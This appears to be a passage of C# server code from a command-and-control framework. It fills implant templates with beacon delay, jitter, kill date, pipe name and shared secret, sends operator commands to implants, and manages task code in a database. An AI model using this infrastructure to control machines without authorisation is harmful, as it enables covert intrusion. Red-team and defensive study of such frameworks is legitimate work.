                            .Replace("{{REP_GRAWL_ANOTHERID}}", this.FormatForVerbatimString(grawl.OriginalServerGuid))
                            .Replace("{{REP_DELAY}}", this.FormatForVerbatimString(grawl.Delay.ToString()))
                            .Replace("{{REP_JITTER_PERCENT}}", this.FormatForVerbatimString(grawl.JItterPercent.ToString()))
                            .Replace("{{REP_CONNECT_ATTEMPTS}}", this.FormatForVerbatimString(grawl.ConneCTAttEmpts.ToString()))
                            .Replace("{{REP_KILL_DATE}}", this.FormatForVerbatimString(grawl.KillDate.ToBinary().ToString()))
                            .Replace("{{REP_GRAWL_SHARED_SECRET_PASSWORD}}", this.FormatForVerbatimString(grawl.GrawlSharedSecretPassword));
                    }
                    else if (template.CommType == CommunicationType.SMB)
                    {
                        return CodeTemplate
                            .Replace("// {{REP_PROF_MESSAGE_TRANSFORM}}", profile.MessageTransform)
                            .Replace("{{REP_PROF_READ_FORMAT}}", this.FormatForVerbatimString(httpProfile.HttpGetResponse.Replace("{DATA}", "{0}").Replace("{ANOTHERID}", "{1}")))
                            .Replace("{{REP_PROF_WRITE_FORMAT}}", this.FormatForVerbatimString(httpProfile.HttpPostRequest.Replace("{DATA}", "{0}").Replace("{ANOTHERID}", "{1}")))
                            .Replace("{{REP_PIPE_NAME}}", grawl.SMBPipeName)
                            .Replace("{{REP_GRAWL_ANOTHERID}}", this.FormatForVerbatimString(grawl.OriginalServerGuid))
                            .Replace("{{REP_DELAY}}", this.FormatForVerbatimString(grawl.Delay.ToString()))
                            .Replace("{{REP_JITTER_PERCENT}}", this.FormatForVerbatimString(grawl.JItterPercent.ToString()))
                            .Replace("{{REP_CONNECT_ATTEMPTS}}", this.FormatForVerbatimString(grawl.ConneCTAttEmpts.ToString()))
                            .Replace("{{REP_KILL_DATE}}", this.FormatForVerbatimString(grawl.KillDate.ToBinary().ToString()))
                            .Replace("{{REP_GRAWL_SHARED_SECRET_PASSWORD}}", this.FormatForVerbatimString(grawl.GrawlSharedSecretPassword));
                    }
                    return CodeTemplate;
                case ProfileType.Bridge:
                    BridgeProfile bridgeProfile = (BridgeProfile)profile;
                    BridgeListener bridgeListener = (BridgeListener)listener;
                    return CodeTemplate
                        .Replace("// {{REP_PROF_MESSAGE_TRANSFORM}}", bridgeProfile.MessageTransform)
                        .Replace("// {{REP_BRIDGE_MESSENGER_CODE}}", bridgeProfile.BridgeMessengerCode)
                        .Replace("{{REP_PROF_WRITE_FORMAT}}", bridgeProfile.WriteFormat.Replace("{DATA}", "{0}").Replace("{ANOTHERID}", "{1}"))
                        .Replace("{{REP_PROF_READ_FORMAT}}", bridgeProfile.ReadFormat.Replace("{DATA}", "{0}").Replace("{ANOTHERID}", "{1}"))
                        .Replace("{{REP_PIPE_NAME}}", grawl.SMBPipeName)
                        .Replace("{{REP_REDWOLF_URI}}", this.FormatForVerbatimString(bridgeListener.ConnectAddresses[0] + ":" + bridgeListener.ConnectPort))
                        .Replace("{{REP_GRAWL_ANOTHERID}}", this.FormatForVerbatimString(grawl.OriginalServerGuid))
                        .Replace("{{REP_DELAY}}", this.FormatForVerbatimString(grawl.Delay.ToString()))
                        .Replace("{{REP_JITTER_PERCENT}}", this.FormatForVerbatimString(grawl.JItterPercent.ToString()))
                        .Replace("{{REP_CONNECT_ATTEMPTS}}", this.FormatForVerbatimString(grawl.ConneCTAttEmpts.ToString()))
                        .Replace("{{REP_KILL_DATE}}", this.FormatForVerbatimString(grawl.KillDate.ToBinary().ToString()))
                        .Replace("{{REP_GRAWL_SHARED_SECRET_PASSWORD}}", this.FormatForVerbatimString(grawl.GrawlSharedSecretPassword));
                default:
                    return CodeTemplate;
            }
        }

        private string FormatForVerbatimString(string replacement)
        {
            return replacement.Replace("\"", "\"\"").Replace("{", "{{").Replace("}", "}}").Replace("{{0}}", "{0}");
        }

        private bool GetPathToChildGrawl(int ParentId, int ChildId, ref List<string> GrawlPath)
        {
            if (ParentId == ChildId)
            {
                return true;
            }

            Grawl parentGrawl = _context.Grawls.FirstOrDefault(G => G.Id == ParentId);
            Grawl childGrawl = _context.Grawls.FirstOrDefault(G => G.Id == ChildId);
            if (parentGrawl == null || childGrawl == null)
            {
                return false;
            }
            if (parentGrawl.Children.Contains(childGrawl.ANOTHERID))
            {
                GrawlPath.Add(childGrawl.ANOTHERID);
                return true;
            }
            foreach (string child in parentGrawl.Children)
            {
                Grawl directChild = _context.Grawls.FirstOrDefault(G => G.ANOTHERID == child);
                if (directChild == null)
                {
                    return false;
                }
                if (GetPathToChildGrawl(directChild.Id, ChildId, ref GrawlPath))
                {
                    GrawlPath.Add(directChild.ANOTHERID);
                    return true;
                }
            }
            return false;
        }

        public async Task<GrawlCommand> InteractGrawl(int GrawlId, string UserId, string UserInput)
        {
            Grawl grawl = await this.GetGrawl(GrawlId);
            RedWolfUser user = await this.GetUser(UserId);

            List<ParsedParameter> parameters = ParsedParameter.GetParsedCommandParameters(UserInput);
            string commandName = parameters.Count > 0 ? parameters.FirstOrDefault().Value : "";
            GrawlTask commandTask = null;
            try
            {
                commandTask = await this.GetGrawlTaskByName(commandName, grawl.DotNetVersion);
                if (commandTask.Options.Count == 1 && new List<string> { "Command", "ShellCommand", "PowerShellCommand", "Code" }.Contains(commandTask.Options[0].Name))
                {
                    string val = UserInput.Substring(UserInput.IndexOf(" ", StringComparison.Ordinal) + 1);
                    if (val.StartsWith("/", StringComparison.Ordinal) && val.IndexOf(":", StringComparison.Ordinal) != -1)
                    {
                        int labelIndex = val.IndexOf(":", StringComparison.Ordinal);
                        string label = val.Substring(1, labelIndex - 1);
                        val = val.Substring(labelIndex + 1, val.Length - labelIndex - 1);
                    }
                    parameters = new List<ParsedParameter>
                    {
                        new ParsedParameter
                        {
                            Value = commandTask.Name, Label = "", IsLabeled = false, Position = 0
                        },
                        new ParsedParameter
                        {
                            Value = val.TrimOnceSymmetric('"').Replace("\\\"", "\""),
                            Label = "", IsLabeled = false, Position = 0
                        }
                    };
                }
            }
            catch (ControllerNotFoundException) { }

            GrawlCommand GrawlCommand = await this.CreateGrawlCommand(new GrawlCommand
            {
                Command = GetCommandFromInput(UserInput, parameters, commandTask),
                CommandTime = DateTime.UtcNow,
                UserId = user.Id,
                GrawlId = grawl.Id,
                CommandOutputId = 0,
                CommandOutput = new CommandOutput()
            });
            try
            {
                string output = "";
                if (commandName.ToLower() == "help")
                {
                    output = await StartHelpCommand(grawl, parameters);
                }
                else if (commandName.ToLower() == "note")
                {
                    grawl.Note = string.Join(" ", parameters.Skip(1).Select(P => P.Value).ToArray());
                    await this.EditGrawl(grawl, user);
                    output = "Note: " + grawl.Note;
                }
                else if (commandTask != null && commandTask.CompatibleDotNetVersions.Contains(grawl.DotNetVersion))
                {
                    string errors = await this.ParseParametersIntoTask(commandTask, parameters);
                    if (!string.IsNullOrEmpty(errors))
                    {
                        this.DisposeContext();
                        GrawlCommand = await this.GetGrawlCommand(GrawlCommand.Id);
                        GrawlCommand.CommandOutput ??= await this.GetCommandOutput(GrawlCommand.CommandOutputId);
                        GrawlCommand.CommandOutput.Output = errors;
                        return await this.EditGrawlCommand(GrawlCommand);
                    }
                    // Parameters have parsed successfully
                    commandTask = await this.EditGrawlTask(commandTask);
                    GrawlTasking tasking = await StartGrawlTasking(grawl, commandTask, GrawlCommand);
                    this.DisposeContext();
                    GrawlCommand = await this.GetGrawlCommand(GrawlCommand.Id);
                }
                else if (commandTask != null && !commandTask.CompatibleDotNetVersions.Contains(grawl.DotNetVersion))
                {
                    output = ConsoleWriter.PrintFormattedErrorLine($"Task: {commandTask.Name} is not compatible with DotNetVersion: {grawl.DotNetVersion.ToString()}");
                }
                else
                {
                    output = ConsoleWriter.PrintFormattedErrorLine("Unrecognized command");
                }
                this.DisposeContext();
                GrawlCommand = await this.GetGrawlCommand(GrawlCommand.Id);
                GrawlCommand.CommandOutput ??= await this.GetCommandOutput(GrawlCommand.CommandOutputId);
                if (GrawlCommand.CommandOutput.Output == "" && output != "")
                {
                    GrawlCommand.CommandOutput.Output = output;
                }
                return await this.EditGrawlCommand(GrawlCommand);
            }
            catch (Exception e)
            {
                this.DisposeContext();
                GrawlCommand = await this.GetGrawlCommand(GrawlCommand.Id);
                GrawlCommand.CommandOutput ??= await this.GetCommandOutput(GrawlCommand.CommandOutputId);
                GrawlCommand.CommandOutput.Output = ConsoleWriter.PrintFormattedErrorLine($"{e.Message}{Environment.NewLine}{e.StackTrace}");
                return await this.EditGrawlCommand(GrawlCommand);
            }
        }
        #endregion

        #region GrawlTaskComponent ReferenceAssembly Actions
        public async Task<IEnumerable<ReferenceAssembly>> GetReferenceAssemblies()
        {
            return await _context.ReferenceAssemblies.ToListAsync();
        }

        public async Task<IEnumerable<ReferenceAssembly>> GetDefaultNet35ReferenceAssemblies()
        {
            return new List<ReferenceAssembly>
            {
                await this.GetReferenceAssemblyByName("mscorlib.dll", Common.DotNetVersion.Net35),
                await this.GetReferenceAssemblyByName("System.dll", Common.DotNetVersion.Net35),
                await this.GetReferenceAssemblyByName("System.Core.dll", Common.DotNetVersion.Net35)
            };
        }

        public async Task<IEnumerable<ReferenceAssembly>> GetDefaultNet40ReferenceAssemblies()
        {
            return new List<ReferenceAssembly>
            {
                await this.GetReferenceAssemblyByName("mscorlib.dll", Common.DotNetVersion.Net40),
                await this.GetReferenceAssemblyByName("System.dll", Common.DotNetVersion.Net40),
                await this.GetReferenceAssemblyByName("System.Core.dll", Common.DotNetVersion.Net40)
            };
        }

        public async Task<ReferenceAssembly> GetReferenceAssembly(int id)
        {
            ReferenceAssembly assembly = await _context.ReferenceAssemblies.FirstOrDefaultAsync(RA => RA.Id == id);
            if (assembly == null)
            {
                throw new ControllerNotFoundException($"NotFound - ReferenceAssembly with id: {id}");
            }
            return assembly;
        }

        public async Task<ReferenceAssembly> GetReferenceAssemblyByName(string name, Common.DotNetVersion version)
        {
            ReferenceAssembly assembly = await _context.ReferenceAssemblies
                .Where(RA => RA.Name == name && RA.DotNetVersion == version)
                .FirstOrDefaultAsync();
            if (assembly == null)
            {
                throw new ControllerNotFoundException($"NotFound - ReferenceAssembly with Name: {name} and DotNetVersion: {version}");
            }
            return assembly;
        }

        public async Task<ReferenceAssembly> CreateReferenceAssembly(ReferenceAssembly assembly)
        {
            await _context.ReferenceAssemblies.AddAsync(assembly);
            await _context.SaveChangesAsync();
            // _notifier.OnCreateReferenceAssembly(this, assembly);
            return await this.GetReferenceAssembly(assembly.Id);
        }

        public async Task<IEnumerable<ReferenceAssembly>> CreateReferenceAssemblies(params ReferenceAssembly[] assemblies)
        {
            await _context.ReferenceAssemblies.AddRangeAsync(assemblies);
            await _context.SaveChangesAsync();
            return assemblies;
        }

        public async Task<ReferenceAssembly> EditReferenceAssembly(ReferenceAssembly assembly)
        {
            ReferenceAssembly matchingAssembly = await this.GetReferenceAssembly(assembly.Id);
            matchingAssembly.Name = assembly.Name;
            matchingAssembly.Location = assembly.Location;
            matchingAssembly.DotNetVersion = assembly.DotNetVersion;
            _context.ReferenceAssemblies.Update(matchingAssembly);
            await _context.SaveChangesAsync();
            // _notifier.OnEditReferenceAssembly(this, matchingAssembly);
            return await this.GetReferenceAssembly(matchingAssembly.Id);
        }

        public async Task DeleteReferenceAssembly(int id)
        {
            ReferenceAssembly matchingAssembly = await this.GetReferenceAssembly(id);
            _context.ReferenceAssemblies.Remove(matchingAssembly);
            await _context.SaveChangesAsync();
            // _notifier.OnDeleteReferenceAssembly(this, matchingAssembly.Id);
        }
        #endregion

        #region GrawlTaskComponents EmbeddedResource Actions
        public async Task<IEnumerable<EmbeddedResource>> GetEmbeddedResources()
        {
            return await _context.EmbeddedResources.ToListAsync();
        }

        public async Task<EmbeddedResource> GetEmbeddedResource(int id)
        {
            EmbeddedResource resource = await _context.EmbeddedResources.FirstOrDefaultAsync(ER => ER.Id == id);
            if (resource == null)
            {
                throw new ControllerNotFoundException($"NotFound - EmbeddedResource with id: {id}");
            }
            return resource;
        }

        public async Task<EmbeddedResource> GetEmbeddedResourceByName(string name)
        {
            EmbeddedResource resource = await _context.EmbeddedResources
                .Where(ER => ER.Name == name)
                .FirstOrDefaultAsync();
            if (resource == null)
            {
                throw new ControllerNotFoundException($"NotFound - EmbeddedResource with Name: {name}");
            }
            return resource;
        }

        public async Task<EmbeddedResource> CreateEmbeddedResource(EmbeddedResource resource)
        {
            await _context.EmbeddedResources.AddAsync(resource);
            await _context.SaveChangesAsync();
            // _notifier.OnCreateEmbeddedResource(this, resource);
            return await this.GetEmbeddedResource(resource.Id);
        }

        public async Task<IEnumerable<EmbeddedResource>> CreateEmbeddedResources(params EmbeddedResource[] resources)
        {
            await _context.EmbeddedResources.AddRangeAsync(resources);
            await _context.SaveChangesAsync();
            return resources;
        }

        public async Task<EmbeddedResource> EditEmbeddedResource(EmbeddedResource resource)
        {
            EmbeddedResource matchingResource = await this.GetEmbeddedResource(resource.Id);
            matchingResource.Name = resource.Name;
            matchingResource.Location = resource.Location;
            _context.EmbeddedResources.Update(matchingResource);
            await _context.SaveChangesAsync();
            // _notifier.OnEditEmbeddedResource(this, resource);
            return await this.GetEmbeddedResource(matchingResource.Id);
        }

        public async Task DeleteEmbeddedResource(int id)
        {
            EmbeddedResource matchingResource = await this.GetEmbeddedResource(id);
            _context.EmbeddedResources.Remove(matchingResource);
            // _notifier.OnDeleteEmbeddedResource(this, matchingResource.Id);
            await _context.SaveChangesAsync();
        }
        #endregion

        #region GrawlTaskComponents ReferenceSourceLibrary Actions
        public async Task<IEnumerable<ReferenceSourceLibrary>> GetReferenceSourceLibraries()
        {
            return await _context.ReferenceSourceLibraries
                .Include("ReferenceSourceLibraryReferenceAssemblies.ReferenceAssembly")
                .Include("ReferenceSourceLibraryEmbeddedResources.EmbeddedResource")
                .ToListAsync();
        }

        public async Task<ReferenceSourceLibrary> GetReferenceSourceLibrary(int id)
        {
            ReferenceSourceLibrary library = await _context.ReferenceSourceLibraries
                .Where(RSL => RSL.Id == id)
                .Include("ReferenceSourceLibraryReferenceAssemblies.ReferenceAssembly")
                .Include("ReferenceSourceLibraryEmbeddedResources.EmbeddedResource")
                .FirstOrDefaultAsync();
            if (library == null)
            {
                throw new ControllerNotFoundException($"NotFound - ReferenceSourceLibrary with id: {id}");
            }
            return library;
        }

        public async Task<ReferenceSourceLibrary> GetReferenceSourceLibraryByName(string name)
        {
            ReferenceSourceLibrary library = await _context.ReferenceSourceLibraries
                .Where(RSL => RSL.Name == name)
                .Include("ReferenceSourceLibraryReferenceAssemblies.ReferenceAssembly")
                .Include("ReferenceSourceLibraryEmbeddedResources.EmbeddedResource")
                .FirstOrDefaultAsync();
            if (library == null)
            {
                throw new ControllerNotFoundException($"NotFound - ReferenceSourceLibrary with Name: {name}");
            }
            return library;
        }

        public async Task<ReferenceSourceLibrary> CreateReferenceSourceLibrary(ReferenceSourceLibrary library)
        {
            await _context.ReferenceSourceLibraries.AddAsync(library);
            await _context.SaveChangesAsync();
            // _notifier.OnCreateReferenceSourceLibrary(this, library);
            return await this.GetReferenceSourceLibrary(library.Id);
        }

        public async Task<IEnumerable<ReferenceSourceLibrary>> CreateReferenceSourceLibraries(params ReferenceSourceLibrary[] libraries)
        {
            await _context.ReferenceSourceLibraries.AddRangeAsync(libraries);
            await _context.SaveChangesAsync();
            return libraries;
        }

        public async Task<ReferenceSourceLibrary> EditReferenceSourceLibrary(ReferenceSourceLibrary library)
        {
            ReferenceSourceLibrary matchingLibrary = await this.GetReferenceSourceLibrary(library.Id);
            matchingLibrary.Name = library.Name;
            matchingLibrary.Description = library.Description;
            matchingLibrary.Location = library.Location;

            var removeAssemblies = matchingLibrary.ReferenceAssemblies.Select(MRA => MRA.Id).Except(library.ReferenceAssemblies.Select(RA => RA.Id));
            var addAssemblies = library.ReferenceAssemblies.Select(MRA => MRA.Id).Except(matchingLibrary.ReferenceAssemblies.Select(MRA => MRA.Id));
            removeAssemblies.ToList().ForEach(async RA => matchingLibrary.Remove(await this.GetReferenceAssembly(RA)));
            addAssemblies.ToList().ForEach(async AA => matchingLibrary.Add(await this.GetReferenceAssembly(AA)));

            var removeResources = matchingLibrary.EmbeddedResources.Select(MER => MER.Id).Except(library.EmbeddedResources.Select(ER => ER.Id));
            var addResources = library.EmbeddedResources.Select(MER => MER.Id).Except(matchingLibrary.EmbeddedResources.Select(MER => MER.Id));
            removeResources.ToList().ForEach(async RR => matchingLibrary.Remove(await this.GetEmbeddedResource(RR)));
            addResources.ToList().ForEach(async AR => matchingLibrary.Add(await this.GetEmbeddedResource(AR)));

            _context.ReferenceSourceLibraries.Update(matchingLibrary);
            await _context.SaveChangesAsync();
            // _notifier.OnEditReferenceSourceLibrary(this, library);
            return await this.GetReferenceSourceLibrary(matchingLibrary.Id);
        }

        public async Task DeleteReferenceSourceLibrary(int id)
        {
            ReferenceSourceLibrary referenceSourceLibrary = await this.GetReferenceSourceLibrary(id);
            _context.ReferenceSourceLibraries.Remove(referenceSourceLibrary);
            await _context.SaveChangesAsync();
            // _notifier.OnDeleteReferenceSourceLibrary(this, referenceSourceLibrary.Id);
        }
        #endregion

        #region GrawlTaskOption Actions
        public async Task<GrawlTaskOption> EditGrawlTaskOption(GrawlTaskOption option)
        {
            _context.Entry(option).State = EntityState.Modified;
            await _context.SaveChangesAsync();
            return option;
        }

        public async Task<GrawlTaskOption> CreateGrawlTaskOption(GrawlTaskOption option)
        {
            await _context.AddAsync(option);
            await _context.SaveChangesAsync();
            // _notifier.OnCreateGrawlTaskOption(this, option);
            return option;
        }

        public async Task<IEnumerable<GrawlTaskOption>> CreateGrawlTaskOptions(params GrawlTaskOption[] options)
        {
            await _context.AddRangeAsync(options);
            await _context.SaveChangesAsync();
            return options;
        }
        #endregion

        #region GrawlTaskAuthor Actions
        public async Task<IEnumerable<GrawlTaskAuthor>> GetGrawlTaskAuthors()
        {
            return await _context.GrawlTaskAuthors.ToListAsync();
        }

        public async Task<GrawlTaskAuthor> GetGrawlTaskAuthor(int id)
        {
            GrawlTaskAuthor author = await _context.GrawlTaskAuthors.FirstOrDefaultAsync(A => A.Id == id);
            if (author == null)
            {
                throw new ControllerNotFoundException($"NotFound - GrawlTaskAuthor with id: {id}");
            }
            return author;
        }

        public async Task<GrawlTaskAuthor> GetGrawlTaskAuthorByName(string Name)
        {
            GrawlTaskAuthor author = await _context.GrawlTaskAuthors.FirstOrDefaultAsync(A => A.Name == Name);
            if (author == null)
            {
                throw new ControllerNotFoundException($"NotFound - GrawlTaskAuthor with Name: {Name}");
            }
            return author;
        }

        public async Task<GrawlTaskAuthor> CreateGrawlTaskAuthor(GrawlTaskAuthor author)
        {
            await _context.AddAsync(author);
            await _context.SaveChangesAsync();
            // _notifier.OnCreateGrawlTaskOption(this, option);
            return author;
        }

        public async Task<GrawlTaskAuthor> EditGrawlTaskAuthor(GrawlTaskAuthor author)
        {
            _context.Update(author);
            await _context.SaveChangesAsync();
            return author;
        }
        #endregion

        #region GrawlTask Actions
        public async Task<IEnumerable<GrawlTask>> GetGrawlTasks()
        {
            return await _context.GrawlTasks
                .Include(T => T.Options)
                .Include(T => T.Author)
                .Include("GrawlTaskReferenceSourceLibraries.ReferenceSourceLibrary")
                .Include("GrawlTaskReferenceSourceLibraries.ReferenceSourceLibrary.ReferenceSourceLibraryReferenceAssemblies.ReferenceAssembly")
                .Include("GrawlTaskReferenceSourceLibraries.ReferenceSourceLibrary.ReferenceSourceLibraryEmbeddedResources.EmbeddedResource")
                .Include("GrawlTaskReferenceAssemblies.ReferenceAssembly")
                .Include("GrawlTaskEmbeddedResources.EmbeddedResource")
                .ToListAsync();
        }

        public async Task<IEnumerable<GrawlTask>> GetGrawlTasksForGrawl(int grawlId)
        {
            Grawl grawl = await this.GetGrawl(grawlId);
            return _context.GrawlTasks
                // .Where(T => T.SupportedDotNetVersions.Contains(version))
                .Include(T => T.Options)
                .Include(T => T.Author)
                .Include("GrawlTaskReferenceSourceLibraries.ReferenceSourceLibrary")
                .Include("GrawlTaskReferenceSourceLibraries.ReferenceSourceLibrary.ReferenceSourceLibraryReferenceAssemblies.ReferenceAssembly")
                .Include("GrawlTaskReferenceSourceLibraries.ReferenceSourceLibrary.ReferenceSourceLibraryEmbeddedResources.EmbeddedResource")
                .Include("GrawlTaskReferenceAssemblies.ReferenceAssembly")
                .Include("GrawlTaskEmbeddedResources.EmbeddedResource")
                .AsEnumerable()
                .Where(T => T.CompatibleDotNetVersions.Contains(grawl.DotNetVersion));
        }

        public async Task<GrawlTask> GetGrawlTask(int id)
        {
            GrawlTask task = await _context.GrawlTasks
                .Where(T => T.Id == id)
                .Include(T => T.Options)
                .Include(T => T.Author)
                .Include("GrawlTaskReferenceSourceLibraries.ReferenceSourceLibrary")
                .Include("GrawlTaskReferenceSourceLibraries.ReferenceSourceLibrary.ReferenceSourceLibraryReferenceAssemblies.ReferenceAssembly")
                .Include("GrawlTaskReferenceSourceLibraries.ReferenceSourceLibrary.ReferenceSourceLibraryEmbeddedResources.EmbeddedResource")
                .Include("GrawlTaskReferenceAssemblies.ReferenceAssembly")
                .Include("GrawlTaskEmbeddedResources.EmbeddedResource")
                .FirstOrDefaultAsync();
            if (task == null)
            {
                throw new ControllerNotFoundException($"NotFound - GrawlTask with id: {id}");
            }
            return task;
        }

        public async Task<GrawlTask> GetGrawlTaskByName(string name, Common.DotNetVersion version = Common.DotNetVersion.Net35)
        {
            string lower = name.ToLower();

            GrawlTask task = _context.GrawlTasks
                .Where(T => T.Name.ToLower() == lower)
                // .Where(T => T.CompatibleDotNetVersions.Contains(version))
                .Include(T => T.Options)
                .Include(T => T.Author)
                .Include("GrawlTaskReferenceSourceLibraries.ReferenceSourceLibrary")
                .Include("GrawlTaskReferenceSourceLibraries.ReferenceSourceLibrary.ReferenceSourceLibraryReferenceAssemblies.ReferenceAssembly")
                .Include("GrawlTaskReferenceSourceLibraries.ReferenceSourceLibrary.ReferenceSourceLibraryEmbeddedResources.EmbeddedResource")
                .Include("GrawlTaskReferenceAssemblies.ReferenceAssembly")
                .Include("GrawlTaskEmbeddedResources.EmbeddedResource")
                .AsEnumerable()
                .Where(T => T.CompatibleDotNetVersions.Contains(version))
                .FirstOrDefault();
            if (task == null)
            {
                // Probably bad performance here
                task = _context.GrawlTasks
                    .Include(T => T.Options)
                    .Include(T => T.Author)
                    .Include("GrawlTaskReferenceSourceLibraries.ReferenceSourceLibrary")
                    .Include("GrawlTaskReferenceSourceLibraries.ReferenceSourceLibrary.ReferenceSourceLibraryReferenceAssemblies.ReferenceAssembly")
                    .Include("GrawlTaskReferenceSourceLibraries.ReferenceSourceLibrary.ReferenceSourceLibraryEmbeddedResources.EmbeddedResource")
                    .Include("GrawlTaskReferenceAssemblies.ReferenceAssembly")
                    .Include("GrawlTaskEmbeddedResources.EmbeddedResource")
                    .AsEnumerable()
                    .Where(T => T.Aliases.Any(A => A.Equals(lower, StringComparison.CurrentCultureIgnoreCase)))
                    .Where(T => T.CompatibleDotNetVersions.Contains(version))
                    .FirstOrDefault();
                if (task == null)
                {
                    throw new ControllerNotFoundException($"NotFound - GrawlTask with Name: {name}");
                }
            }
            return await Task.FromResult(task);
        }

        private async Task<string> GetUsageForGrawlTask(int id)
        {
            return await GetUsageForGrawlTask(await this.GetGrawlTask(id));
        }

        private async Task<string> GetUsageForGrawlTask(GrawlTask task)
        {
            string usage = "Usage: " + task.Name;
            foreach (var option in task.Options)
            {
                if (option.Optional)
                {
                    usage += "[ <" + option.Name.ToLower() + "> ]";
                }
                else
                {
                    usage += " <" + option.Name.ToLower() + ">";
                }
            }
            return await Task.FromResult(usage);
        }

        public async Task<GrawlTask> CreateGrawlTask(GrawlTask task)
        {
            List<GrawlTaskOption> options = task.Options.ToList();
            List<EmbeddedResource> resources = task.EmbeddedResources.ToList();
            List<ReferenceAssembly> assemblies = task.ReferenceAssemblies.ToList();
            List<ReferenceSourceLibrary> libraries = task.ReferenceSourceLibraries.ToList();
            task.Options = new List<GrawlTaskOption>();
            task.EmbeddedResources.ForEach(ER => task.Remove(ER));
            task.ReferenceAssemblies.ForEach(RA => task.Remove(RA));
            task.ReferenceSourceLibraries.ForEach(RSL => task.Remove(RSL));

            GrawlTaskAuthor author = await _context.GrawlTaskAuthors.FirstOrDefaultAsync(A => A.Name == task.Author.Name);
            if (author != null)
            {
                task.AuthorId = author.Id;
                task.Author = author;
            }
            else
            {
                await _context.GrawlTaskAuthors.AddAsync(task.Author);
                await _context.SaveChangesAsync();
                task.AuthorId = task.Author.Id;
            }

            await _context.GrawlTasks.AddAsync(task);
            await _context.SaveChangesAsync();

            foreach (GrawlTaskOption option in options)
            {
                option.GrawlTaskId = task.Id;
                await _context.AddAsync(option);
                await _context.SaveChangesAsync();
            }
            foreach (EmbeddedResource resource in resources)
            {
                await this.CreateEntities(
                    new GrawlTaskEmbeddedResource
                    {
                        EmbeddedResource = await this.GetEmbeddedResourceByName(resource.Name),
                        GrawlTask = task
                    }
                );
            }
            foreach (ReferenceAssembly assembly in assemblies)
            {
                await this.CreateEntities(
                    new GrawlTaskReferenceAssembly
                    {
                        ReferenceAssembly = await this.GetReferenceAssemblyByName(assembly.Name, assembly.DotNetVersion),
                        GrawlTask = task
                    }
                );
            }
            foreach (ReferenceSourceLibrary library in libraries)
            {
                await this.CreateEntities(
                    new GrawlTaskReferenceSourceLibrary
                    {
                        ReferenceSourceLibrary = await this.GetReferenceSourceLibraryByName(library.Name),
                        GrawlTask = task
                    }
                );
            }
            await _context.SaveChangesAsync();
            // _notifier.OnCreateGrawlTask(this, task);
            return await this.GetGrawlTask(task.Id);
        }

        public async Task<IEnumerable<GrawlTask>> CreateGrawlTasks(params GrawlTask[] tasks)
        {
            List<GrawlTask> createdTasks = new List<GrawlTask>();
            foreach (GrawlTask t in tasks)
            {
                createdTasks.Add(await this.CreateGrawlTask(t));
            }
            return createdTasks;
        }

        public async Task<GrawlTask> EditGrawlTask(GrawlTask task)
        {
            GrawlTask updatingTask = await this.GetGrawlTask(task.Id);
            updatingTask.Name = task.Name;
            updatingTask.Description = task.Description;
            updatingTask.Help = task.Help;
            updatingTask.Aliases = task.Aliases;
            if (updatingTask.Code != task.Code)
            {
                updatingTask.Code = task.Code;
                updatingTask.Compiled = false;
            }
            else
            {
                updatingTask.Compiled = task.Compiled;
            }
            updatingTask.UnsafeCompile = task.UnsafeCompile;
            updatingTask.TokenTask = task.TokenTask;
            updatingTask.TaskingType = task.TaskingType;

            task.Options.Where(O => O.Id == 0).ToList().ForEach(async O => await this.CreateGrawlTaskOption(O));
            var removeOptions = updatingTask.Options.Select(UT => UT.Id).Except(task.Options.Select(O => O.Id));
            removeOptions.ToList().ForEach(RO => updatingTask.Options.Remove(updatingTask.Options.FirstOrDefault(UO => UO.Id == RO)));
            foreach (var option in updatingTask.Options)
            {
                var newOption = task.Options.FirstOrDefault(T => T.Id == option.Id);
                if (newOption != null)
                {
                    option.Name = newOption.Name;
                    option.Description = newOption.Description;
                    option.Value = newOption.Value;
                    option.SuggestedValues = newOption.SuggestedValues;
                    option.Optional = newOption.Optional;
                    option.DisplayInCommand = newOption.DisplayInCommand;
                }
            }

            var removeAssemblies = updatingTask.ReferenceAssemblies.Select(MRA => MRA.Id).Except(task.ReferenceAssemblies.Select(RA => RA.Id));
            var addAssemblies = task.ReferenceAssemblies.Select(MRA => MRA.Id).Except(updatingTask.ReferenceAssemblies.Select(MRA => MRA.Id));
            removeAssemblies.ToList().ForEach(async RA => updatingTask.Remove(await this.GetReferenceAssembly(RA)));
            addAssemblies.ToList().ForEach(async AA => updatingTask.Add(await this.GetReferenceAssembly(AA)));

            var removeResources = updatingTask.EmbeddedResources.Select(MER => MER.Id).Except(task.EmbeddedResources.Select(ER => ER.Id));
            var addResources = task.EmbeddedResources.Select(MER => MER.Id).Except(updatingTask.EmbeddedResources.Select(MER => MER.Id));
            removeResources.ToList().ForEach(async RR => updatingTask.Remove(await this.GetEmbeddedResource(RR)));
            addResources.ToList().ForEach(async AR => updatingTask.Add(await this.GetEmbeddedResource(AR)));

            var removeLibraries = updatingTask.ReferenceSourceLibraries.Select(MRSL => MRSL.Id).Except(task.ReferenceSourceLibraries.Select(RSL => RSL.Id));
            var addLibraries = task.ReferenceSourceLibraries.Select(RSL => RSL.Id).Except(updatingTask.ReferenceSourceLibraries.Select(MRSL => MRSL.Id));
            removeLibraries.ToList().ForEach(async RL => updatingTask.Remove(await this.GetReferenceSourceLibrary(RL)));
            addLibraries.ToList().ForEach(async AL => updatingTask.Add(await this.GetReferenceSourceLibrary(AL)));

            GrawlTaskAuthor author = await _context.GrawlTaskAuthors.FirstOrDefaultAsync(A => A.Name == task.Author.Name);
            if (author != null)
            {
                updatingTask.AuthorId = author.Id;
                updatingTask.Author = author;
            }
            else
            {
                await _context.GrawlTaskAuthors.AddAsync(task.Author);
                await _context.SaveChangesAsync();
                updatingTask.AuthorId = task.Author.Id;
                updatingTask.Author = task.Author;
            }

            _context.GrawlTasks.Update(updatingTask);
            await _context.SaveChangesAsync();

            // _notifier.OnEditGrawlTask(this, updatingTask);
            return updatingTask;
        }

        public async Task DeleteGrawlTask(int taskId)
        {
            GrawlTask removingTask = await this.GetGrawlTask(taskId);
            if (removingTask == null)
            {
                throw new ControllerNotFoundException($"NotFound - GrawlTask with id: {taskId}");
            }
            _context.GrawlTasks.Remove(removingTask);
            await _context.SaveChangesAsync();
            // _notifier.OnDeleteGrawlTask(this, removingTask.Id);
        }
        #endregion

        #region GrawlCommand Actions
        public async Task<IEnumerable<GrawlCommand>> GetGrawlCommands()
        {
            return await _context.GrawlCommands
                .Include(GC => GC.User)
                .Include(GC => GC.GrawlTasking)
                    .ThenInclude(GT => GT.GrawlTask)
                .ToListAsync();
        }

